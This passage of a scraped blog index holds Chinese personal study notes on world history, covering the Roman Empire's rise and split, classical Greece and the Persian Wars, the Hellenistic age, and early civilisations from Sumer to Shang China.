在军事方面，罗马意图建立起一支常备军，因此失业的农民们应招入伍，而平民军队逐渐变成职业军队，军队不对国家效忠，而是对指挥官效忠。将军开始讲军团视为私兵，并从中中饱私囊。 文化 ​ 在罗马人原先的理念中，贫穷与简朴是罗马人的传统美德。而在征服富庶的地区(马其顿&amp;希腊)后，巨量的财富使得罗马人疯狂地抢夺金钱，挥霍浪费，漠视一切道德准则。而这成为了罗马共和国末期的主要特征。 阶级斗争、农民起义和愈演愈烈的军人干预政治严重威胁着国家的存亡。 pre: 失败的改革与起义 尤里乌斯·凯撒与屋大维​ 尤里乌斯·凯撒与公元前49年击败了由庞培指挥的元老院的军队，成为了帝国的统治者，但凯撒与公元前44年被旧寡头政客暗杀。 ​ 凯撒遇刺后，养子屋大维即位，屋大维与马克·安东尼开始了长达13年的政治斗争 ​ 红颜祸水啊马克大将军 ​ 自此，屋大维于公元前31年独揽大权，开启了罗马的黄金时代。 早期罗马帝国(公元前27-公元284) 公元前27年，元老院赋予屋大维”奥古斯都”与”大元帅”的尊号，标志着罗马进入帝国时代。 奥古斯都的行政管理体系 由本人亲自监督的中央集权制度，直接控制各行省的总督，严厉惩罚贪污受贿、敲诈勒索行为 规定收税标准 严密控制军队，提高军队待遇，军队直接向奥古斯都效忠 建立了一支常备海军，用于镇压海盗，保护航路 四个昏君与五个贤帝 罗马帝国的疆域 北面: 福斯湾-克莱德湾(苏格兰南) 东北: 莱茵河-多瑙河 +绕过整个达契亚地区(今罗马尼亚) 东: 小亚细亚&amp;埃及(紧挨地中海沿岸，内地归帕提亚人) 南: 撒哈拉沙漠为南部边境线，控制了埃及和大西洋间的沿海地区 details 将城市文化传播到中欧与北欧 足以自给自足的国内自由贸易 100多万人口(公元2世纪)的罗马城 开挖沟渠、铺设下水道网络、修建桥梁、铺设公路 世俗性的建筑物: 浴室、圆形剧场、运动场、凯旋门等 法律 公元前450年，颁布《十二铜表法》 公元前三世纪中叶，颁布《万民法》 《十二铜表法》:父系继承制，但是女性拥有继承财产与获得不动产的权利 帝国中期衰微​ 公元180年马克·奥勒留皇帝将皇位传给了无能的亲生儿子(前任们是将皇位传给确有才能的养子)，其后果是灾难性的，后代的皇帝大多无能昏庸。 ​ 禁卫军难以控制，只有受禁卫军支持的皇帝才能正常掌权 =&gt; 公元235至公元284年，上位了24个皇帝，但是只有一位自然死亡。 ​ 西北的行省遭到各个日耳曼部落袭击，而东方的行省受到萨萨尼亚人手中重新崛起的波斯帝国的侵犯。 四帝共治core ​ 一个罗马帝国，由两位正皇帝和两位副皇帝共同统治，借此以更好的控制广袤的帝国，挽救罗马在行政管理体制方面的严重缺陷。 ​ 为了加强四位皇帝之间的纽带联系，戴克里先还规定：“奥古斯都”要认”凯撒”为继子，还要把女儿许配给”凯撒”，并在20年任期结束后，让位于”凯撒”，以这种姻亲关系保持世袭统治。 process ​ 在原来，戴克里先为了应付外敌入侵，需要驻守在小亚细亚，无暇顾及帝国的西部。而实施”四帝共治”后，他将色雷斯、下麦西亚、亚洲诸省、埃及和昔兰尼加作为自己直辖地，同时任命自己的心腹大将马克西米安为”凯撒(副皇帝)”，第二年又将其提升为”奥古斯都(皇帝)”，让他驻守在米兰，统治意大利、阿非利加省、里西亚和诺里克等地区。 ​ 为了应付不列颠、埃及的叛乱和波斯王国的威胁，戴克里先又提拔了两个年轻的军官君士坦提乌斯(其子为君士坦丁一世，链接中翻译为康斯坦丁)和加列尼乌斯为”凯撒(副皇帝)”，让他们分别统治罗马帝国的其他两片区域。 positive ​ 戴克里先在继位伊始就树立起了自己的绝对权威，而他所提拔的三个”皇帝”，又均是自己的心腹，所以，”四帝共治”刚刚开始，就显现出了立竿见影的效果。 由戴克里先亲自驻守的小亚细亚地区，成为帝国继罗马城之外的第二个政治中心，抵御东方蛮族的桥头堡。 由马克西米安驻守的西部，加列里乌斯驻守的巴尔干各省，君士坦提乌斯驻守的高卢、不列颠、西班牙，都极大的为戴克里先分担了压力，帝国的内部危机得到了很大程度上的缓解。 negative ​ 尽管”四帝共治”取得了立竿见影的成效，维系了罗马帝国的统一，但是，这一切都是建立在戴克里先绝对的个人权威之上的。 虽然马克西米安与戴克里先是共治皇帝，二人分享”奥古斯都”的头衔，但是，戴克里先实际上仍然是罗马帝国的最高君主。马克西米安和另外两个”凯撒”，其实并不是敬畏”四帝共治”的制度，而是慑于戴克里先的个人权威。 ​ 一旦一个继承者没有像戴克里先这样的才能，当他不足以驾驭整个庞大的帝国时，罗马的命运就有可能走向歧途。更为要命的是，帝国的四位皇帝，都有属于自己的领土和军队，都有能力对对方发起挑战，这就为罗马帝国日后的分裂埋下了祸根。 18年的诸帝混战​ 公元305年，因为20年任期结束，戴克里先和马克西米安自愿退位，君士坦提乌斯和加列里乌斯分别晋升为西部和东部的”奥古斯都”。随后，加列里乌斯又专横地任命其外甥马克西米努斯和部将塞维鲁二世分别担任罗马东、西部的”凯撒”。 ​ 加列里乌斯首先坏了规矩，君士坦提乌斯也不客气。公元306年，在君士坦提乌斯去世后，他的儿子君士坦丁一世就直接自立为”西部奥古斯都”。后来，他接受了”东部奥古斯都”加列里乌斯之命，改任”西部凯撒”。 ​ 马克西米安虽然退位了，但他的儿子马克森提乌斯却在罗马城自称是”西部奥古斯都“，与君士坦丁一世针锋相对。 ​ 同时，他还邀请自己的父亲马克西米安再次出山。与自己的共治，同为”奥古斯都”。此时，试图进攻马克森提乌斯的”西部凯撒”塞维鲁二世兵败被俘，后被处死。 ​ 君士坦丁一世为了取得马克西米安的支持，于是便迎娶了他的女儿，从而被马克西米安宣布为”西部奥古斯都“。此举也让马克西米安与自己的儿子决裂，他被迫从罗马出走。 ​ 看到这种混乱局面，”东部奥古斯都”加列里乌斯马上召集已经退休的戴克里先和马克西米安商议对策，他们决定：马克西米安宣布退位，君士坦丁一世降回”西部凯撒”，”西部奥古斯都”则由加列里乌斯的部将李锡尼出任。 ​ 公元310年，君士坦丁一世再次自立为”西部奥古斯都”，而加列里乌斯的侄子马克西米努斯则自立为”东部奥古斯都“，不服老的马克西米安也自立为奥古斯都，但很快兵败自尽。 ​ 公元311年，”东部奥古斯都”加列里乌斯病死。第二年，君士坦丁一世发动了米尔维安大桥之战，杀死了马克西米安的儿子马克森提乌斯，君士坦丁一世成为名副其实的”西部奥古斯都“。也就是在这一年，”四帝共治”的发明人戴克里先病逝。 ​ 公元313年，李锡尼击败并杀死了自立为”东部奥古斯都“的马克西米努斯，成为唯一的”东部奥古斯都“。 重回君主专政​ 公元324年，罗马东西两部发生了一场大战——阿德里安堡战役，结果李锡尼和他任命的”西部奥古斯都”双双战败被俘，并于第二年被处死。君士坦丁一世成为继戴克里先之后的又一位帝国唯一统治者。 君士坦丁一世废除了”四帝共治制”，并且创立了血亲世袭继承制，最终确立了罗马帝国的君主专制政体。 宗教传播https://zhuanlan.zhihu.com/p/28871773 君士坦丁作出了通过与基督教合作(而不是继续镇压基督教)来谋求稳定和平统一的决定 ​ 公元前313年，君士坦丁颁布《米兰赦令》，承认基督教不再为异教徒，准许基督教拥有信仰自由。 ​ 公元380年，狄奥多西皇帝确立了基督教为罗马的国教。公元4世纪末，基督教占据了统治地位。 民授皇权 =&gt; 神授皇权 东西罗马帝国分裂(摘自万维百科)公元395年，最后一名罗马帝国统一皇帝狄奥多西一世立下遗言，把帝国照戴克里先的分法分给自己的两个儿子，东部分给长子阿卡狄乌斯，西部分给幼子霍诺里乌斯，分别治理。西罗马帝国定都梅蒂奥拉努（米兰的古称）。东罗马帝国（后称拜占庭帝国）则定都君士坦丁堡（今伊斯坦布尔）。自此之后罗马帝国永久分裂。 西罗马帝国灭亡的外因 - 蛮族入侵 406年起，西罗马的皇帝已无法阻挡高卢、西班牙和非洲的法兰克人、勃艮第人、西哥特人以及汪达尔人长期的大规模入侵。 410年与450年，罗马城被蛮族人两次洗劫。 公元476年，西罗马最后一个皇帝罗慕路斯·奥古斯图卢斯在日耳曼(即匈奴)的雇佣军首领奥多亚塞的逼迫下退位。 西罗马帝国灭亡的内因 - 奴隶制 国家失去了改进传统技术的积极性 丧失了技术革新的动机 出现认为从事体力劳动有损尊严的倾向 国内市场发展被扼制 - 奴隶无法购买自己的劳动成果，限制了国内购买力增长 东罗马帝国没有灭亡的原因 东部的工业比西部的工业先进 中东冲积平原比意大利半岛的粮食产量多 =&gt; 西部的经济不如东部发达","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"5.希腊化时代-全球通史","date":"2020-12-04T07:35:00.000Z","path":"2020/12/04/hobbies/history/全球通史/5.希腊化时代-全球通史/","text":"希腊-罗马文明史(上) 注:由于篇幅限制，希腊-罗马的历史分开为05、06节来讲述 希腊文明形成时期(公元前800 - 公元前500)黑暗时代缘由: 公元前12世纪多里安人入侵，迈锡尼文明彻底毁灭，希腊进入黑暗时期。 政治制度: 部落制&amp;贵族政治占主导。 经济发展: 以自给自足的小农经济为主。 changes时期: 公元前6世纪末(公元前500年左右)。 政治制度: 城邦制代替了部落制，其他社会等级联合向贵族发起挑战。 经济发展: 殖民地逐渐重新遍布整个地中海沿岸一代，工商业发展在社会经济生活中发挥了重大作用。 reasons(引起变革的原因) preview:地理特点 ​ 希腊地区自然资源匮乏，也没有大河流域&amp;平原，只有连绵不绝的山脉。(而丰富的自然资源则是建立帝国的前提之一) 地理特点的影响 限制了农业生产率的提高。 将地区分隔为了互不相连的小块，导致希腊人没有天然可作为地区合并基础的地理政治中心。 村庄通常坐落在易于防卫的高地附近，而高地上一般设立供奉诸神的庙宇，且这些庙宇也可作为遭遇危险时的避难所。 这些村庄扩大而成的居留地称“城邦”。 而这些庙宇(提供避难所的地方)则称“卫城”或“高城”。 各城邦多设在土壤肥沃的地方或商路附近，以此吸引更多的移民，成为该地区的主要城市。 因此，小城邦们彼此相互隔绝，但又生气勃勃地独立发展。 人口逐渐密集&amp;资源总量不变 人们当起了海盗、商人以及殖民者，或是同时从事这三种活动。 经济改革&amp;军事变革 殖民地遍布 公元5世纪时，包括黑海在内的整个地中海地区遍布了希腊人的殖民地(这些殖民地都是城邦制)。 殖民地把以谷物为主的原材料运到人口过剩的希腊本土，交换酒、橄榄油、布匹、陶瓷等物品，同时希腊本土的土地则空余出来种植葡萄树与橄榄树。 由于外国市场货币经济以及新奢侈品，使得小农阶级受到压迫，当收成不好则会抵押物品乃至失去人身自由，导致小农阶级与贵族阶级的矛盾恶化。 城市中新兴的富裕阶层也要求获得与经济力量相符的政治地位，他们获得了城市贫民&amp;工人的支持，阶级矛盾进一步恶化。 贵族骑兵被穿戴盔甲的重装步兵(持长矛站方阵)取代 =&gt; 贵族政治权利的军事基础瓦解，且提高了独立的、能为自己提供进入方阵的必要装备的农民&amp;工匠的地位。 政治变革​ 城邦的君主政体渐渐都转向了贵族寡头政治(成为”僭主”的贵族独裁制)，这些独裁者们一般是贵族出身，且支持民众的要求，因此获得了民众的支持&amp;个人的权力。 僭主: 指未经过当时合法政治推选程序而进行统治的人，并没有贬义。 加速了民主政治产生 例外 - 与民主政治相反的斯巴达​ 公元前1000年，斯巴达人的祖先多里安人入侵了希洛人，将其变成奴隶；公元前800年，斯巴达人征服了麦西尼亚附近的肥沃平原，放弃了海外扩张；由于需要控制大量被压迫的当地居民，其不得不将国家组织得像一个军营，男子从七岁到六十岁都需要接收军事训练；有组织的娱乐活动、集体进餐、公众事务、军事训练与执勤几乎是生活的全部内容。 民主政治的代表 - 雅典 雅典人在殖民之后，并没有侵犯土著人的权益，而是积极融入土著。 最初实行君主政体，之后变为由九个执政官主持的寡头政治，九个执政官全部属于贵族。 急速发展的贸易创造出了一个强有力的中产阶级，其与失去产业的农民(原因见上地理特点)一起要求实现政治自由化。 民主政策的基础 - 首席执政官(前594)公元前594年，所有政治派别一致同意任命梭伦为首席执政官，梭伦采取了一系列减轻社会矛盾的政策： 将债务人失去的全部的土地所有权交还，将因负债沦为奴隶的人全部重新恢复自由。 准许没有财产的平民参与公民大会(此时公民大会的权利仍旧十分有限)。 规定富裕的商人可以当任执政官，并设立新的、更受欢迎的陪审法庭代替贵族最高法院行使部分权力。 缺陷 贫民谋生仍旧艰难。 贵族特权受到一定约束，但是仍然可以阻挡人民立法。 僭越制与矛盾进一步加剧(前560)​ 公元前560年，庇西特拉图成为雅典历史上第一位僭主，他将贵族土地分配给农民，且让城市贫民参加大规模美化城市的公共工程以获得国家补助(为贫民提供工作机会)。 ​ 庇西特拉图死后，其儿子们世袭了僭主的身份，但由于其各个昏庸无能，导致雅典的政治斗争更为尖锐复杂。 民主政治出现(前506)​ 公元前506年，克利斯梯尼掌握了政治局势，取消了原来血缘关系的部落组织形式，建立了按地区划分的新部落，大大削弱了贵族的权力；克利斯梯尼还设立了五百人会议，规定所有年满30岁的男性公民都有资格当代表，五百人会议拥有最高执政权与行政权，还可以为公民会议准备议案。 希腊文明古典时代(前500-前336) “我们的城市向全世界开放……雅典是希腊的学校。” ——伯里克利 伯里克利时期是雅典的黄金时代，也是全希腊在古典时代中的黄金时代。 希波战争(部分转载自 https://www.seegold.cn/zhanzheng/guowai/93.html )reason​ 波斯人与公元前6世纪中期(前550年左右)征服了小亚细亚地区的希腊城邦，并且暴虐地干涉城邦中的内部事务，导致这些城邦于公元前499年爆发了反对波斯的起义，并向本土求援。 ​ 在公元前465年，尽管得到了希腊本土城邦海军的援助，小亚细亚城邦还是被波斯帝国制服了，此时大流士(波斯帝国皇帝)决定对希腊本土的希腊人进行讨伐，与公元前490年在雅典西北面的马拉松登陆。 first invasion​ 公元前490年春，大流士一世派达提斯和阿塔非尼斯率军约5万(包括近400艘战船)第二次远征希腊。首先攻占并破坏了埃雷特里亚城，继而南进，在距雅典东北约40公里的马拉松平原登陆。 马拉松战役 ​ 雅典一面紧急动员全体雅典公民赴马拉松应战，一面派遣长跑健将斐力庇第斯星夜奔往斯巴达求援。他在两天内跑了150公里，于9月9日到达斯巴达。斯巴达人虽然同意出兵，但声称只有等待月亮圆了才能出兵援助。这样，反波斯入侵的任务就完全落在雅典身上。 雅典派米提阿德斯组编一万重装步兵，前赴波斯军的着陆地点——马拉松平原与之决战，而雅典则由海军负责防守。9月12日晨，马拉松会战开始。 希腊步兵占据有利地形。波斯军队为雅典军队的两倍，米提阿德斯因而将全军布阵至与波斯军队一样长度的简单平行战斗序列，并将精锐安插在两翼。雅典趁波斯军大部分骑兵尚未赶到会战地点，佯作正面进攻。 交战初期，波斯军依仗兵力优势，采取中央突破战术，雅典军中路被波斯军步步进逼，只得向后退却，而波斯军中路则因而突出了。雅典军两侧精锐立即合围中路波斯军，结果波斯陆军被围歼，被完全击败。而由海路偷袭雅典的波斯海军，亦不能打败雅典海军。波斯军只得撤退。 在马拉松大战获胜后，一位名叫斐力庇第斯的士兵跑回雅典传信，因为极速跑了42.193公里，报捷后便倒地身亡，而这亦是马拉松长跑的来源。 马拉松会战成为古代战争史上以少胜多的范例之一。雅典军于马拉松战役只有192人阵亡，而波斯军则损失了6400人，但这对于庞大的波斯帝国来说并不是重大的打击，因此波斯帝国在此战后仍时刻寻找机会进攻希腊。 此后10年间，双方紧张备战。波斯征集大量兵员物资，建造大批舰船，架设浮桥，开凿运河。希腊方面，雅典政府建造100多艘三层桨战船，扩建各项防御工事，并加强海军训练，30多个城邦结成军事同盟，推举拥有强大陆军的斯巴达为盟主，随时准备抗击波斯入侵。 decisive雅典人在希波战争之前发现了老里昂银矿，在之后雅典人立即决定建立了两百余艘新式三层划桨战舰。 second invasion​ 公元前480年春，接任的波斯王泽克西斯一世（即薛西斯一世）亲率陆军25万及战舰1000艘再度进兵希腊。雅典面对波斯大军再度压境，全城立即进入备战状态，以地米斯托克利为主帅，阿里斯德岱斯为副将迎战。这次波斯号称百万大军压境，使得全希腊各城邦均有着生死存亡已系于一线的感觉，因此结盟起来，共抗波斯，即使是斯巴达城邦亦参与了对抗波斯的行动。 ​ 波斯军分水陆两路，沿色雷斯西进，占领北希腊，迫使一些城邦投降，波斯军随后进军到温泉关。 温泉关战役 (300斯巴达精兵) ​ 斯巴达王李奥尼达以其本国精兵300人及伯罗奔尼撒半岛其它城邦的7000人负责防守希腊的第一道防线——温泉关。李奥尼达及其士兵与百万波斯陆军拼命厮杀，使得波斯军队在头两天不得寸进，并且死伤惨重。但在第三天，一个希腊的叛徒引导波斯军队抄小路进攻李奥尼达的后方，李奥尼达无法抵御，只得下令让伯罗奔尼撒半岛的军队先撤，并以其自己的三百精兵死守温泉关，在经过一番激烈厮杀后，斯巴达全军覆灭 ​ 温泉关战役以300人两次击杀上万人的典故成为以少胜多的经典事例。其英勇的事迹却留传后世，为后人所景仰。 雅典空城计 ​ 斯巴达王及其士兵的牺牲为雅典军主帅特米斯托克利斯赢得了宝贵的时间，波斯军虽然在其后迅速占领了希腊三分之二的土地，但在攻至雅典时，却发现雅典只剩下一座空城，全城居民早已撤走，结果波斯军只得焚城以泄愤。 萨拉米湾海战 ​ 波斯海军绕过阿提卡半岛南端的苏尼翁角，进入狭窄的萨拉米斯海峡。公元前480年9月，雅典300多艘战舰在萨拉米湾集结，并派人假装逃兵，向波斯王谎报雅典舰队内讧，应即时出兵，结果成功引诱波斯王下令全军600多艘巨型战舰驶进海湾。希腊舰队隐藏在艾加莱奥斯山后，编成两线战斗队形，勇敢地发起攻击。 ​ 然而萨拉米湾甚为狭窄，波斯的巨型战舰不能自由行驶，而雅典的战舰只小巧迅速，并以船头的撞角来撞击波斯舰只的侧面，波斯舰队结果乱成一团。希腊联合舰队在提米斯托克利的指挥下，力战8个小时击溃波斯，波斯军队只得撤退。 ​ 波斯海军遭受重大损失，新征希腊的薛西斯一世深恐后路被切断，仓皇败逃回国。其陆军退至北希腊。 third invasion​ 前479年8月，波斯王派大将统率5万大军再度进攻希腊，这次特米斯托克利斯再次使用空城计，移师海面。而斯巴达则统率伯罗奔尼撒半岛联军共三万与波斯陆军于布拉底附近举行决定性会战，并击毙了波斯大将，结果波斯军大败，只得再次撤回东方。波斯人的第三次远征以失败告终。 reverse​ 波斯远征希腊失败，加之帝国内部矛盾重重，被迫退居守势。以雅典为首的希腊则逐渐转入进攻，并乘机扩张海上势力，建立雅典在爱琴海域的霸权。前478年，以雅典为首的希腊海军反攻波斯，占领赫勒斯滂海峡北岸的重镇塞斯托斯，从而控制了通向黑海的要道。同年(一说前477年)，雅典联合一批希腊城邦组成海上同盟，夺取色雷斯沿岸地区、爱琴海上许多岛屿和战略要地拜占庭。 ​ 公元前449年，希腊海军在塞浦路斯岛东岸的萨拉米斯城附近重创波斯军，至此双方同意媾和。雅典派全权代表卡里阿斯赴波斯首都苏萨谈判并签订了《卡里阿斯和约》。和约规定：波斯放弃对爱琴海及赫勒斯滂和博斯普鲁斯海峡（黑海出口）的控制，承认小亚细亚西岸希腊诸城邦的独立地位。希波战争宣告结束。 influence 使希腊免受东方专制主义的统治，得以保持自身民主政治的特色。 城市贫民在海战中起的作用非常大，加强了民主政治的发展。 民主政治 &amp; 伯里克利 伯里克利的政治制度 ​ 伯里克利将权力转移到了全体雅典男性公民组成的公民大会手中，公民大会是处理雅典事务的最高权力机构，一年召开40次例会(如有需要还会再召开临时例会)；它不仅解决一般的政策问题，还负责对政府在外交、军事和财政等一切领域的所有活动做详细决定。 ​ 伯里克利还规定大部分公职实行薪给制，使贫民也能担任公职。他还建立起许多由陪审团做最后决断的民众法庭。陪审团由抽签产生，所有公民都可担任。 雅典在希腊半岛的霸权 - 提洛同盟 (霸权同盟) ​ 在斯巴达由于一成不变的小农经济以及经常受到国内希洛人的起义而停滞不前时，雅典带头联合爱琴海各岛以及小亚细亚各希腊城邦组建了提洛同盟。 ​ 同盟的宗旨是防备波斯人再次发动进攻，以确保联邦的共同安全，原则上各邦是平等的召开全盟例会时各加盟城邦都有一票否决权，但实际上: 雅典掌握了行政领导权，没有战舰或不愿意提供战舰的盟邦须向雅典交纳贡金； 雅典还加进了对各盟邦的控制；同盟金库从提洛转移到了雅典； 雅典铸币成为了共同的交换媒介； 规定入盟城邦不得退出联邦。 =&gt; 到公元前450年，提洛同盟实际上已经变成了一个帝国。 雅典与斯巴达的相互战争 (以雅典战败而结束，雅典结束了民主政治) 斯巴达与底比斯人的战争 ​ 由于斯巴达专横跋扈，底比斯与雅典为求相互保护而结为新的联盟，公元前371年，底比斯人战败斯巴达人(斯巴达人200年来第一次军事上的惨败)，在十年内称霸了希腊本土。 相互斗争与外来势力入侵 ​ 紧接着，各城邦又卷入了相互的争斗中，使得外来的马其顿人暴力统一了希腊。 ​ 公元前335年，马其顿国王腓力二世征服了整个希腊，剥夺了希腊各城邦的大部分自治权。但其与公元前336年遇刺身亡，其继承人亚历山大大帝即位。自此，希腊文明的古典时代终结，希腊化时代开启。 希腊民主政治的弊端 希腊化时代(公元前336 - 公元前31)亚历山大大帝征服中东​ 公元前336年，亚历山大大帝继承了腓力二世的马其顿皇位，首先严酷镇压了底比斯的反抗，使得希腊各城邦只好接受他的统治；之后在公元前334年马其顿对东方的波斯帝国发起了进攻，并与前330年击败了大流士，占领了波斯国都波斯波利斯；第二年，亚历山大大帝又对印度发起进攻，但是由于士兵拒绝继续前进而退回巴比伦。公元前323年亚历山大患疟疾而病逝，终年33岁。 ​ 公元前3世纪初，马其顿帝国分裂成三个王国: 马其顿王国:恢复原状，是一个疆域不大、希腊化的民族王国。 埃及王国:托勒密王朝统治，自然资源丰富，且有大海与沙漠做屏障。 塞琉西王朝: 疆域最广的王国，由亚洲诸行省组成。 亚历山大帝国对中东带来的影响 中东希腊化 希腊人离开本土前往中东 希腊本土的衰落 希腊本土经济状况衰落，殖民地发展起了工业、葡萄园以及橄榄园，而希腊本土无从交易。 ​ 中东地区接受了希腊文化，希腊人纷纷移居前往中东，以其先进的商业、金融方法、科学技术提高了生产率，促进了地区经济一体化。但是随之也导致了收入分配不公，奴隶数量增加，劳动者地位不断下降。 中东地区的影响 文化四分五裂 科技进步显著 《几何原理》、地心说、测量技术、解剖研究…… 总结希腊化时代打破了历史上形成的东、西方各自独立发展的模型，使其合二为一，希腊化文明成为了一个东西方文化的混合物。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"4.欧亚大陆的一致性-全球通史","date":"2020-12-02T08:45:00.000Z","path":"2020/12/02/hobbies/history/全球通史/4.欧亚大陆的一致性-全球通史/","text":"古代文明 - 欧亚大陆的一致性preview 一致性的根源 —— 技术进步铁器的普及 农业生产率急剧增长 货币与易货贸易 船舶、航海与殖民 商队的路线(航线) 社会&amp;政治 ​ 军事贵族与公元前2000的蛮族入侵中获得的地位由于商人、工匠与海员阶层的兴起而日趋瓦解；旧部落社会由于铸币的出现正在经历变革；==个人的依附效忠关系正被谁长需要代替。== ​ 经济的发展促成了政治上中央集权制的建立，而后者又促进了前者的发展，强化了社会秩序与治安，保障了陆路与海路的长途贸易。 思想文化 ​ 由于上述社会关系、政治组织、生活方式与谋生之道等方面发生了深刻变化，使得人心无法适从。 商业纽带 商队 &amp; 航路(在当时的陆路并没有海路发达，且在公元6-77世纪左右阿拉伯人占据了欧亚之间的中东，阻断了陆路贸易) &amp; 殖民地。 硬币的开创(希腊地区)，打破以物易物为主的不平等交易的限制。 文化纽带字母文字体系 ​ 由西奈半岛的闪米特人发明；由腓尼基人发展完成，共有23个辅音音符(公元前13世纪)；经希腊人添加元音字符而完备，形成希腊字母；经罗马人向西，拜占庭向东传播。 ​ 埃及-美索不达米亚的祭司&amp;吏官为了垄断智力交流渠道，回避了新字母，采用传统文字；中国由于与世隔绝也在使用原创文字(由表音和象形两种文字结合而成)。 question: 为何希腊文化能传遍整个中东？ ​ 亚历山大大帝东征，新统治地区的重要城市基本上全部希腊化，且对异端文化采取同化的态度。 希腊建筑风格 陶立克式，爱奥尼亚式以及科林斯式。 宗教 基督教与大乘佛教与古典时代后期迅速传遍中东(=&gt;全欧洲)及印度(基本全亚洲)。 犹太教(基督教其实起源于犹太教)： 大乘佛教与小乘佛教 大乘佛教的传播历史(在东南亚曾一度出现的，历时几个世纪的普遍印度化现象): 佛教的衰落:","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"3.古代文明及游牧入侵-全球通史","date":"2020-11-26T10:46:00.000Z","path":"2020/11/26/hobbies/history/全球通史/3.古代文明及游牧入侵-全球通史/","text":"古代文明preview 城市的建立是为了能够让人们过上更好的生活。 –亚里士多德 每个城邦都分裂成了两个城邦:多数穷人的城邦和少数富人的城邦，而且这两个城邦总在相互交战。 –柏拉图 最早的文明 – 苏美尔 – 公元前3500年 古代文明的起源 与新石器时代部落文化的区分: 城市成为社会中心。 由制度确立的国家政治权利 – 纳贡&amp;交税。 文字。 社会分为阶级或等级。 巨大的建筑。 专门的艺术&amp;科学。 转化 技术进步 灌溉术 - 开掘沟渠，将河水引入田中。 冶金术 - 熔炼提取铜，合金(青铜)。 梨 - 使用人类自身以外的力量来用作动力。 粗糙的横帆 - 风力。 车轮 - 陶艺(轮盘)。 制度变革 人口增加使得村落发展为城市。 城市由新型的宗教贵族以及后来形成的军事首脑和行政首脑来统治。 食物出现剩余，社会足以供养新生的祭祀阶级，军队以及官吏。 宗教 村庄圣祠发展为寺院，寺院有祭司与仆从，可以看做为最早的贵族。 祭司集团发明文字，主持宗教活动，还管理大量的经济活动。 大大促进了手工业品的产量(寺院的需要)。 权力转移 – 世俗贵族 随着寺院财富的高度集中，客观上容易遭受战争劫掠。 当一个公社遭受攻击时，普遍大众会推举出来一位战争领导人，随着战争频率的增加其领导人的任期时间变得越来越长，最终进一步发展成了永久的军事首领，最后当上了国王。 寺院开始与宫廷产生矛盾并且争斗，直到双方妥协。 通常，祭司们会保留他们占有的土地，且继续履行他们的宗教职责，而宫廷的官吏们会建造城墙，大量招募军队，以对付邻近的城市；后来，这些军队又被用于发展帝国。 建设军队与建筑宫殿的费用对早期国家来说是沉重的负担，对此传统议会只敢畏畏缩缩反对，导致权力进一步集中，最终被国王取代。 各文明的出现日期(大概) 古代文明的类型显著的共性： 1. 社会关系不平等 - 阶级分化 2. 性别关系不平等 - 女性作用被认为小于男性(安内被认为没有安外重要，男性垄断技术与工具，政治与经济)。美索不达米亚起源 苏美尔地区的苏美尔人，由于苏美尔人的城市互相攻击而导致被南方的闪米特人与北方的印欧人同时入侵,(之后苏美尔地区被不断连续入侵)。 第一代帝国的奠立者: 萨尔贡一世 (闪米特人， 前2276 - 前2221)。 另一个伟大的帝国: 汉谟拉比(闪米特人， 前1704 - 前1662) =&gt; 汉谟拉比法典 文化情况 - 城市为基本单位(**城市文明**)。 - 大多数平民依靠农夫 - 工匠 - 商人 - 渔民 - 牧民维生。 - 每个城市独有一个**手工艺人阶层**，在自由市场上出卖自己的手工艺品，买主支付货币或以实物代替货币(货币通常是银块或银环，每次交易称重)。 - 城墙外为农田，其所有权大多所有者都是过往，祭司和一些富人，他们将地租给农民。 - 楔形文字， 数学/天体观测。 《汉谟拉比法典》 同态复仇。 阶级歧视。 严格保护商业社会财产(盗窃死刑)。 类似于福利国家的政策(限定必需品价格，限定利息率，保证度量衡的信誉，赔偿受害者损失)。 认为过去，现在，未来永恒不变(诅咒后面改变法律的人)。 男性地位优于女性(一夫多妻，女子通奸对奸夫以及女性处死刑)。 埃及起源 =&gt; 公元前3100年统一，公元前525年被波斯征服 长时间处于统一王朝统治下的统一的大河流域国家。 埃及人生活于安全的流域地区，不用担心外敌入侵。 文化情况 帝国文明(不同于城市文明)。 重视死亡 - 金字塔&amp;木乃伊。 王权通过以宰相为首的官僚机构得到强化，宰相被称为全国的管家 &amp; 国家的耳目。 官僚机构下设掌玺大臣(交通运输)，赏赐大臣(牲畜)，财政大臣(财政分署)，省长以及下属管理周围城市和村庄的市长。 国家对经济生活的绝对控制，尽管出现私有财产以及私营企业，但其存在不普遍。 国家控制农业 手工业的大部分生产活动，还负责产品的分配。 收税。 用于国家开支，也用于饥荒时期的储备物。 男子强制性劳役(金字塔就是最著名的劳动成果)。 埃及工匠 - 制造奢侈品 (珠宝饰物，搪瓷饰品，象牙，珍珠镶嵌工艺品，玻璃，鞣制皮革，亚麻布，化妆品)。 克里特(希腊)起源 =&gt; 克里特岛 “海洋文明”，依靠贸易繁荣 文化情况 中转贸易，将地中海此端的商品转卖到地中海彼端国家去。 城市不设防，海军强大。 村庄在不论社会地位还是经济地位上，都比大陆上的村庄更奉行平等主义。 主要由村庄组成，村庄很大。 进行宗教活动的地点位于村庄中心。 可能出现家庭奴隶，但是不多(没有供奴隶住的房屋)。 艺术家：在日用品 - 墙 - 自己的艺术作品上描绘的都是他们周围的生活。 建筑不关心外表，但关注舒适度。 克诺索斯城的王宫 - 规模宏大，结构复杂，历经几个世纪，占一大半面积都是仓库与手工业作坊 - 复杂的给水与排水系统。 远离战争，男女平等。 印度河文化情况 浓厚的宗教色彩与高度的计划性。 于公元前2500年达到成熟期，此后的1000年中极少变化。 整齐划一的城市布局与有条不紊的建设安排，统一的度量衡。 象形文字(上一行从左向右，下一行从右向左，’S’形) 文明衰落的原因 &gt; 约于公元前1500年，或是由于中亚雅利安人的入侵，或是印度河流域的文明泥浆淹没。商地理位置 封闭，由山脉，高原，沙漠与大陆的其他部分分隔开。 起源 =&gt; 公元前1500年 地理位置的交汇点，黄河流域北部，同时受到西北的游牧民族，西边的农耕民族以及南方的森林居民影响。 文化情况 养蚕，丝织品；不普遍食用动物的乳汁。 宗教 - 祖先崇拜，看重姓氏。 社会中起主要作用的是家庭，而不是个人/国家/教会。 象形文字 - 甲骨文。 